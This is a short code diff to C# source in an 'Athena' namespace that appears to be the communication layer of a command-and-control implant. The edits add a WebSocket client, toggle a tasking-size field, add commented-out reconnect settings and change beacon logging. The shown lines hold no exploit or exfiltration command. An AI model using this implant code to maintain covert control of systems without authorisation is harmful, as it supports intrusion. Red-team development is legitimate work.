@@ -31,6 +31,7 @@ namespace Athena
         private int maxAttempts = 5;
         public int connectAttempts { get; set; }
         public DateTime killDate { get; set; }
+        public ClientWebSocket ws { get; set; }
         public PSKCrypto crypt { get; set; }
         private CancellationTokenSource cts = new CancellationTokenSource();
         public event EventHandler<MessageReceivedArgs> SetMessageReceived;
@@ -111,6 +112,8 @@ namespace Athena
             });
             this._client.DisconnectionHappened.Subscribe(info =>
                 Debug.WriteLine($"Disconnection happened, type: {info.Type}"));
+            //this._client.ReconnectTimeout = TimeSpan.Zero;
+            //this._client.ErrorReconnectTimeout = TimeSpan.Zero;
             this._client.Start().Wait();
         }
         public async Task StartBeacon()
@@ -137,7 +140,7 @@ namespace Athena
                 GetTasking gt = new GetTasking()
                 {
                     action = "post_response",
-                    //tasking_size = -1,
+                    tasking_size = -1,
                     delegates = delegateTask.Result,
                     socks = socksTask.Result,
                     responses = responseTask.Result,
@@ -149,7 +152,7 @@ namespace Athena
                 }
                 catch (Exception e)
                 {
-                    Debug.WriteLine($"[{DateTime.Now}] Beacon attempt failed {e}");
+                    Debug.WriteLine($"[{DateTime.Now}] Becaon attempt failed {e}");
                     this.currentAttempt++;
                 }
 
@@ -173,7 +176,7 @@ namespace Athena
             do
             {
                 Debug.WriteLine("Sending.");
-                if (await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin)))
+                if(await this.Send(JsonSerializer.Serialize(checkin, CheckinJsonContext.Default.Checkin)))
                 {
                     break;
                 }
